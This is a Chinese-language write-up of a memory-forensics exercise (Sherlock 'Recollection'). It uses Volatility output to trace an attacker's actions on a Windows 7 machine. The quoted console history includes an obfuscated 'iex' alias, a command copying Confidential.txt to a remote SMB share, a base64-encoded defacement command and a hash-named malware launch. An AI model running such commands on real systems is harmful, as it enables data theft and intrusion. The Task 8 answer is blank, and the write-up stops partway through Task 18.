# Recollection

:::info Sherlock Scenario

A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.

我们安全团队的一名初级成员一直在对我们认为是旧且不安全的操作系统进行研究和测试。我们相信它可能已经遭到入侵，并且我们已经成功获取了该资产的内存转储。我们希望确认攻击者采取了哪些行动，以及我们环境中是否还有其他资产受到影响。请回答以下问题。
:::

## 题目数据

:::note

由于附件过大，故在此不提供下载链接

:::

## Task 1

> 机器的操作系统是什么？

Volatility2

```shell title="python2 ./volatility-master/vol.py -f recollection.bin imageinfo"
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/randark/recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600
```

Volatility3

```shell title="vol -f recollection.bin windows.info"
Kernel Base     0xf8000285c000
DTB     0x187000
Symbols file:///home/randark/.local/lib/python3.10/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdDebuggerDataBlock     0xf80002a3f120
NTBuildLab      7601.24214.amd64fre.win7sp1_ldr_
CSDVersion      1
KdVersionBlock  0xf80002a3f0e8
Major/Minor     15.7601
MachineType     34404
KeNumberProcessors      1
SystemTime      2022-12-19 16:07:30
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  6
NtMinorVersion  1
PE MajorOperatingSystemVersion  6
PE MinorOperatingSystemVersion  1
PE Machine      34404
PE TimeDateStamp        Thu Aug  2 02:18:10 2018
```

```plaintext title="Answer"
Windows 7
```

## Task 2

> 内存转储是什么时候创建的？

上文中就有

```plaintext title="Answer"
2022-12-19 16:07:30
```

## Task 3

> 在攻击者获得对机器的访问权限后，攻击者将一个混淆的 PowerShell 命令复制到了剪贴板上。这个命令是什么？

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 clipboard"
Volatility Foundation Volatility Framework 2.6.1
Session    WindowStation Format                         Handle Object             Data
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260
         1 WinSta0       0x0L                              0x0 ------------------
```

```plaintext title="Answer"
(gv '*MDR*').naMe[3,11,2]-joIN''
```

## Task 4

> 攻击者复制了混淆命令，将其用作 PowerShell 命令的别名。这个命令的名称是什么？

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
Volatility Foundation Volatility Framework 2.6.1
**************************************************
ConsoleProcess: conhost.exe Pid: 3524
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe - powershell
AttachedProcess: powershell.exe Pid: 3532 Handle: 0xdc
AttachedProcess: cmd.exe Pid: 4052 Handle: 0x60
----
CommandHistory: 0xc2c50 Application: powershell.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 at 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 at 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #3 at 0xc72a0: cd .\Downloads
Cmd #4 at 0xbdf10: ls
Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
----
CommandHistory: 0xbebe0 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0xc2f80: powershell -command "(gv'*MDR*').naMe[3,11,2]-joIN''"
Cmd #1 at 0xbd660: powershell
----
Screen 0xa10c0 X:80 Y:300
Dump:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>powershell -command "(gv'*MDR*').naMe[3,11,2]-joIN''"
iex

C:\Users\user>powershell
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
The network path was not found.
At line:1 char:47
+ type C:\Users\Public\Secret\Confidential.txt > <<<<  \\192.168.0.171\pulice\p ass.txt
    + CategoryInfo          : OpenError: (:) [], IOException
    + FullyQualifiedErrorId : FileOpenFailure

PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
The term '??????????????????????????????' is not recognized as the name of a cm
dlet, function, script file, or operable program. Check the spelling of the nam
e, or if a path was included, verify that the path is correct and try again.
At line:1 char:31
+ ?????????????????????????????? <<<<
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:
   String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\user> powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
The term '??????????????????????????????' is not recognized as the name of a cm
dlet, function, script file, or operable program. Check the spelling of the nam
e, or if a path was included, verify that the path is correct and try again.
At line:1 char:31
+ ?????????????????????????????? <<<<
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:
   String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\user> cd .\Downloads
PS C:\Users\user\Downloads> ls


    Directory: C:\Users\user\Downloads


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-----        12/19/2022   2:59 PM     420864 b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
-a---        12/19/2022   9:00 PM     313152 b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip
-a---        12/19/2022   9:00 PM     205646 bf9e9366489541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.zip
-a---        12/19/2022   3:00 PM     309248 csrsss.exe
-a---        12/17/2022   4:16 PM    5885952 wazuh-agent-4.3.10-1.msi


PS C:\Users\user\Downloads> .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
PS C:\Users\user\Downloads>
**************************************************
ConsoleProcess: conhost.exe Pid: 2312
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 4 HistoryBufferMax: 4
OriginalTitle: Windows PowerShell
Title: Windows PowerShell
AttachedProcess: powershell.exe Pid: 3688 Handle: 0x60
----
CommandHistory: 0x1be7b0 Application: powershell.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x1be500 Application: net1.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xddaf0 Application: net.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x1bdab0 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 5 LastAdded: 4 LastDisplayed: 4
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0xd7980: gv '*MDR*').naMe[3,11,2]-joIN''
Cmd #1 at 0xd79d0: (gv '*MDR*').naMe[3,11,2]-joIN''
Cmd #2 at 0x1bc560: net users
Cmd #3 at 0x1be6e0: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #4 at 0xd7a20: (gv '*MDR*').naMe[3,11,2]-joIN''
----
Screen 0xe18a0 X:120 Y:3000
Dump:
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user> gv '*MDR*').naMe[3,11,2]-joIN''
Unexpected token ')' in expression or statement.
At line:1 char:12
+ gv '*MDR*') <<<<.naMe[3,11,2]-joIN''
    + CategoryInfo          : ParserError: ():String) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnexpectedToken

PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
PS C:\Users\user> net users

User accounts for \\USER-PC

-------------------------------------------------------------------------------
Administrator            Guest                    user
The command completed successfully.

PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
The term '??????????????????????????????' is not recognized as the name of a cmdlet, function, script file, or operable
 program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:31
+ ?????????????????????????????? <<<<
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
PS C:\Users\user>
```

在其中关注到

```shell
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
```

```plaintext title="Answer"
Invoke-Expression
```

## Task 5

> 执行了一个 CMD 命令，试图将一个文件渗透出去。完整的命令行是什么？

在上一题中可以得到

```plaintext title="Answer"
type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
```

## Task 6

> 在上述命令之后，请告诉我们文件是否成功被渗透出去了？

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\passtxt
The network path was not found.
At line:1 char:47
+ type C:\Users\Public\Secret\Confidential.txt > <<<<  \\192.168.0.171\pulice\pass.txt
    + CategoryInfo          : OpenError: (:) [], IOException
    + FullyQualifiedErrorId : FileOpenFailure
```

```plaintext title="Answer"
No
```

## Task 7

> 攻击者试图创建一个 readme 文件。这个文件的完整路径是什么？

在 `Task 4` 中就有

```shell
powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```

```plaintext title="Answer"
C:\Users\Public\Office\readme.txt
```

## Task 8

> 机器的主机名是什么？

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 hivelist"
Volatility Foundation Volatility Framework 2.6.1
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a004266010 0x000000009a90f010 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a004a41010 0x000000009df13010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a004a57010 0x000000009ddb9010 \SystemRoot\System32\Config\SAM
0xfffff8a00000d190 0x00000000a9882190 [no name]
0xfffff8a000024010 0x00000000a96fa010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a00004f010 0x00000000a9725010 \REGISTRY\MACHINE\HARDWARE
0xfffff8a0006d4010 0x0000000081300010 \SystemRoot\System32\Config\SECURITY
0xfffff8a000733010 0x00000000a1d49010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a000ca4010 0x000000009f5fb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a000d35010 0x00000000976ff010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a00125b010 0x0000000083a0c010 \??\C:\Users\user\ntuser.dat
0xfffff8a0012e3010 0x000000007cb5d010 \??\C:\Users\user\AppData\Local\Microsoft\Windows\UsrClass.dat
0xfffff8a00257e010 0x0000000106fd2010 \??\C:\System Volume Information\Syscache.hve
```

定位到 `\REGISTRY\MACHINE\SYSTEM`

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 printkey -o 0xfffff8a000024010 -K'ControlSet001\Control\ComputerName\ComputerName'"
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2022-12-10 23:48:28 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) USER-PC
```

```plaintext title="Answer"

```

## Task 9

> 机器上有多少个用户账户？

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
PS C:\Users\user> net users

User accounts for \\USER-PC

-------------------------------------------------------------------------------
Administrator            Guest                    user
The command completed successfully.
```

```plaintext title="Answer"
3
```

## Task 10

> 在 "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" 文件夹中，有一些子文件夹，其中有一个名为 passwords.txt 的文件。这个文件的完整位置 / 路径是什么？

```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep"Microsoft"| grep"Edge"| grep"passwords"'
Volatility Foundation Volatility Framework 2.6.1
0x000000011fc10070      1      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

```plaintext title="Answer"
\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

## Task 11

> 使用命令执行了一个恶意可执行文件。这个可执行的 EXE 文件的名称是其自身的哈希值。这个哈希值是什么？

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
......
Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

```plaintext title="Answer"
b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1
```

## Task 12

> 根据上述问题，你找到的恶意文件的 Imphash 是什么？

首先，先定位到这个文件

```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep"b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1"'
Volatility Foundation Volatility Framework 2.6.1
0x000000011ee95460     12      0 R--rw- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip
0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

然后将文件提取出来

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011fa45c20 -n -D ./"
Volatility Foundation Volatility Framework 2.6.1
ImageSectionObject 0x11fa45c20   None   \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
DataSectionObject 0x11fa45c20   None   \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

对 `file.None.0xfffffa8003b62990.b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe.dat` 这个文件，使用 `Pestudio` 进行分析

![img](img/image_20240307-000741.png)

```plaintext title="Answer"
d3b592cd9481e4f053b5362e22d61595
```

## Task 13

> 根据上述问题，告诉我们恶意文件的创建日期（使用 UTC 格式）是什么？

根据 `exiftools` 的分析结果

```shell title="exiftool file.None.0xfffffa8003b62990.b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe.dat"
ExifTool Version Number         : 12.40
File Name                       : file.None.0xfffffa8003b62990.b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe.dat
Directory                       : .
File Size                       : 412 KiB
File Modification Date/Time     : 2024:03:05 00:03:31+08:00
File Access Date/Time           : 2024:03:05 00:05:43+08:00
File Inode Change Date/Time     : 2024:03:05 00:03:31+08:00
File Permissions                : -rw-rw-r--
File Type                       : Win32 EXE
File Type Extension             : exe
MIME Type                       : application/octet-stream
Machine Type                    : Intel 386 or later, and compatibles
Time Stamp                      : 2022:06:22 19:49:04+08:00
Image File Characteristics      : Executable, 32-bit
PE Type                         : PE32
Linker Version                  : 9.0
Code Size                       : 66560
Initialized Data Size           : 366080
Uninitialized Data Size         : 0
Entry Point                     : 0x527e
OS Version                      : 5.0
Image Version                   : 0.0
Subsystem Version               : 5.0
Subsystem                       : Windows GUI
File Version Number             : 100.0.0.0
Product Version Number          : 98.0.0.0
File Flags Mask                 : 0x392a
File Flags                      : (none)
File OS                         : Unknown (0x60481)
Object File Type                : Unknown
File Subtype                    : 0
```

```plaintext title="Answer"
2022-06-22 11:49:04
```

## Task 14

> 机器的本地 IP 地址是什么？

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 netscan"
Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x11e01f750        UDPv4    127.0.0.1:1900                 *:*                                   1248     svchost.exe    2022-12-19 15:34:44 UTC+0000
0x11e063940        UDPv4    0.0.0.0:3702                   *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e063940        UDPv6    :::3702                        *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e0727d0        UDPv4    0.0.0.0:5355                   *:*                                   288      svchost.exe    2022-12-19 15:32:47 UTC+0000
0x11e09a900        UDPv4    0.0.0.0:0                      *:*                                   288      svchost.exe    2022-12-19 15:32:44 UTC+0000
0x11e09a900        UDPv6    :::0                           *:*                                   288      svchost.exe    2022-12-19 15:32:44 UTC+0000
0x11e09ca60        UDPv4    0.0.0.0:5355                   *:*                                   288      svchost.exe    2022-12-19 15:32:47 UTC+0000
0x11e09ca60        UDPv6    :::5355                        *:*                                   288      svchost.exe    2022-12-19 15:32:47 UTC+0000
0x11e15aec0        UDPv4    0.0.0.0:3702                   *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e362880        UDPv4    0.0.0.0:55071                  *:*                                   1248     svchost.exe    2022-12-19 15:32:38 UTC+0000
0x11e36fec0        UDPv4    0.0.0.0:55072                  *:*                                   1248     svchost.exe    2022-12-19 15:32:38 UTC+0000
0x11e36fec0        UDPv6    :::55072                       *:*                                   1248     svchost.exe    2022-12-19 15:32:38 UTC+0000
0x11e37a440        UDPv4    0.0.0.0:3702                   *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e37a440        UDPv6    :::3702                        *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e3b2bf0        UDPv4    192.168.0.104:138              *:*                                   4        System         2022-12-19 15:32:47 UTC+0000
0x11e3b40e0        UDPv4    192.168.0.104:137              *:*                                   4        System         2022-12-19 15:32:47 UTC+0000
```

定位 `Local Address` 即可

```plaintext title="Answer"
192.168.0.104
```

## Task 15

> 有多个 PowerShell 进程，其中一个进程是另一个进程的子进程。它的父进程是哪个进程？

```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 pstree"
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa8005967060:explorer.exe                     2032   1988     23    906 2022-12-19 15:33:13 UTC+0000
. 0xfffffa8003de2750:notepad.exe                     3476   2032      1     62 2022-12-19 15:50:42 UTC+0000
. 0xfffffa80059e9b00:msedge.exe                      2380   2032     43   1123 2022-12-19 15:34:29 UTC+0000
.. 0xfffffa800383cb00:msedge.exe                     2752   2380     16    300 2022-12-19 15:34:32 UTC+0000
.. 0xfffffa8003ce4700:msedge.exe                     2060   2380     15    255 2022-12-19 15:53:59 UTC+0000
.. 0xfffffa80055e3160:msedge.exe                     2396   2380      8     87 2022-12-19 15:34:29 UTC+0000
.. 0xfffffa800586e2d0:msedge.exe                     2588   2380     16    235 2022-12-19 15:34:31 UTC+0000
.. 0xfffffa8003bc1b00:msedge.exe                     2160   2380     12    161 2022-12-19 16:03:52 UTC+0000
.. 0xfffffa8003d7c060:msedge.exe                     3560   2380     15    330 2022-12-19 16:03:48 UTC+0000
.. 0xfffffa8005addb00:msedge.exe                     3032   2380     12    191 2022-12-19 15:34:35 UTC+0000
.. 0xfffffa800586eb00:msedge.exe                     2680   2380      8    142 2022-12-19 15:34:31 UTC+0000
.. 0xfffffa8003b16b00:msedge.exe                      980   2380     12    195 2022-12-19 15:35:05 UTC+0000
. 0xfffffa8003cbc060:cmd.exe                         4052   2032      1     23 2022-12-19 15:40:08 UTC+0000
.. 0xfffffa8005abbb00:powershell.exe                 3532   4052      5    606 2022-12-19 15:44:44 UTC+0000
. 0xfffffa8003d6b060:powershell.exe                  3688   2032      5    367 2022-12-19 15:43:39 UTC+0000
 0xfffffa80036ef040:System                              4      0     81    519 2022-12-19 15:32:28 UTC+0000
. 0xfffffa80048f1920:smss.exe                         260      4      2     29 2022-12-19 15:32:28 UTC+0000
 0xfffffa8004fa7b00:csrss.exe                         328    320      9    330 2022-12-19 15:32:30 UTC+0000
 0xfffffa80036f9060:wininit.exe                       376    320      3     76 2022-12-19 15:32:30 UTC+0000
. 0xfffffa8004ef18e0:services.exe                     472    376      8    189 2022-12-19 15:32:30 UTC+0000
.. 0xfffffa800524c060:svchost.exe                     672    472      7    244 2022-12-19 15:32:32 UTC+0000
.. 0xfffffa8003a60060:wmpnetwk.exe                   2652    472     13    409 2022-12-19 15:34:54 UTC+0000
.. 0xfffffa80052a8060:svchost.exe                     804    472     18    438 2022-12-19 15:32:32 UTC+0000
... 0xfffffa8005959230:dwm.exe                       2012    804      3     73 2022-12-19 15:33:13 UTC+0000
.. 0xfffffa80058d4b00:taskhost.exe                   1960    472      9    203 2022-12-19 15:33:13 UTC+0000
.. 0xfffffa80052b3b00:svchost.exe                     832    472     17    382 2022-12-19 15:32:32 UTC+0000
.. 0xfffffa8005477b00:svchost.exe                    1248    472     16    268 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa8005423b00:svchost.exe                    1220    472     10    189 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa80059152d0:SearchIndexer.                 1784    472     14    623 2022-12-19 15:33:19 UTC+0000
.. 0xfffffa80052dcb00:svchost.exe                     288    472     14    464 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa80053a9b00:svchost.exe                    1144    472     17    314 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa8005207790:svchost.exe                     596    472     10    348 2022-12-19 15:32:31 UTC+0000
.. 0xfffffa80052beb00:svchost.exe                     856    472     28    945 2022-12-19 15:32:32 UTC+0000
... 0xfffffa8003ba9060:wuauclt.exe                   3336    856      3     94 2022-12-19 15:35:59 UTC+0000
... 0xfffffa8003f08b00:taskeng.exe                   3268    856      4     77 2022-12-19 16:03:12 UTC+0000
.. 0xfffffa8003a32b00:sppsvc.exe                     1572    472      4    147 2022-12-19 15:34:52 UTC+0000
.. 0xfffffa8005373b00:spoolsv.exe                    1116    472     13    268 2022-12-19 15:32:37 UTC+0000
.. 0xfffffa800527ab00:svchost.exe                     764    472     18    468 2022-12-19 15:32:32 UTC+0000
. 0xfffffa8004fce500:lsass.exe                        480    376      6    547 2022-12-19 15:32:30 UTC+0000
. 0xfffffa8004efab00:lsm.exe                          488    376      9    141 2022-12-19 15:32:30 UTC+0000
 0xfffffa8004fb3b00:csrss.exe                         388    368      8    377 2022-12-19 15:32:30 UTC+0000
. 0xfffffa8003d67060:conhost.exe                     2312    388      2     54 2022-12-19 15:43:39 UTC+0000
. 0xfffffa8003a8db00:conhost.exe                     3524    388      2     55 2022-12-19 15:40:08 UTC+0000
 0xfffffa8004ffb300:winlogon.exe                      428    368      3    111 2022-12-19 15:32:30 UTC+0000
```

```plaintext title="Answer"
cmd.exe
```

## Task 16

> 攻击者可能使用了一个电子邮件地址来登录社交媒体。你能告诉我们这个电子邮件地址是什么？

```shell title='strings recollection.bin | grep"mail"| grep -E"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}"'
......
```

```plaintext title="Answer"
mafia_code1337@gmail.com
```

## Task 17

> 受害者使用 MS Edge 浏览器搜索了一个 SIEM 解决方案。这个 SIEM 解决方案的名称是什么？

首先，先查找保存历史记录的文件

```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep -i"history"'
Volatility Foundation Volatility Framework 2.6.1
0x000000011de6e9c0     16      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History-journal
0x000000011deb9220     18      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\Nurturing\campaign_history
0x000000011e0795f0     18      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Nurturing\campaign_history
0x000000011e0d16f0     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
0x000000011e4d59e0     16      0 R--rwd \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Windows\History\desktop.ini
0x000000011fc57a10     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History-journal
```

然后将历史记录的文件提取出来

```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011e0d16f0 -D ./'
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
SharedCacheMap 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
```

将提取出来的文件作为 `sqlite` 数据库进行加载，在 `keyword_search_terms` 表中得到以下信息

| keyword_id | url_id |            term             |       normalized_term       |
| :--------: | :----: | :-------------------------: | :-------------------------: |
|     2      |   5    | install wazuh agent windows | install wazuh agent windows |
|     2      |   12   |        malwarebazaar        |        malwarebazaar        |
|     2      |   21   |        malwarebazaar        |        malwarebazaar        |
|     2      |   23   |      7 zip windows 10       |      7 zip windows 10       |
|     2      |   24   |       7 zip windows 7       |       7 zip windows 7       |
|     2      |   27   |        base64 encode        |        base64 encode        |

```plaintext title="Answer"
Wazuh
```

## Task 18

> 受害者用户下载了一个 exe 文件。该文件的名称模仿了一个来自 Microsoft 的合法二进制文件，但有一个拼写错误（例如，合法的二进制文件是 powershell.exe，攻击者将恶意软件命名为 powershall.exe）。告诉我们这个带有文件扩展名的文件名是什么？

首先，先定位文件

```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep -i"Downloads"'
Volatility Foundation Volatility Framework 2.6.1
0x000000011dff8aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
0x000000011e0ee070     16      0 R--rw- \Device\HarddiskVolume2\Users\user\Links\Downloads.lnk
0x000000011e580e40     15      0 R--rwd \Device\HarddiskVolume2\Users\user\Downloads\desktop.ini
0x000000011e7d1aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
